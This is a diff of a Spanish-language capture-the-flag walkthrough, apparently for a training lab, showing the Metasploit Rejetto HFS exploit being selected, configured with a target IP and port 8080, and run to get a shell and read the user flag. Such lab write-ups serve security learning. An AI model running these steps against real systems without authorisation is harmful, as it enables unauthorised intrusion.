@@ -45,4 +45,20 @@ Abrimos una de ellas para buscar el CVE
 
 ![image](https://user-images.githubusercontent.com/44788583/149647575-a38e5561-022a-4e55-ae90-5b55e97db98c.png)
 
-- use 1 para elegir la opción 1 que es lo que 
+Usé 1 para elegir la opción 1 que es la que tiene el exploit para Rejetto HFS
+- show options para ver qué parámetros se ponen en metasploit
+
+![image](https://user-images.githubusercontent.com/44788583/149689958-8bbac4bb-61fe-401f-8956-5712bc6c96cf.png)
+![image](https://user-images.githubusercontent.com/44788583/149690590-eec86396-02c6-4439-ad46-30775459dddd.png)
+Se ponen los parámetros para 
+- set RHOSTS 10.10.166.61
+- set RPORT 8080
+- run
+Ahora ya tenemos una consola de metasploit corriendo el exploit y nos vamos a la carpeta C:/Users/bill/Desktop
+![image](https://user-images.githubusercontent.com/44788583/149698796-86dc3fb2-429f-46fc-bcc2-10b6c47fc817.png)
+Vemos que la flag está presente
+- cat user.txt
+![image](https://user-images.githubusercontent.com/44788583/149699085-08ee3dac-49ea-4bec-8676-84ee16f721b5.png)
+
+
+
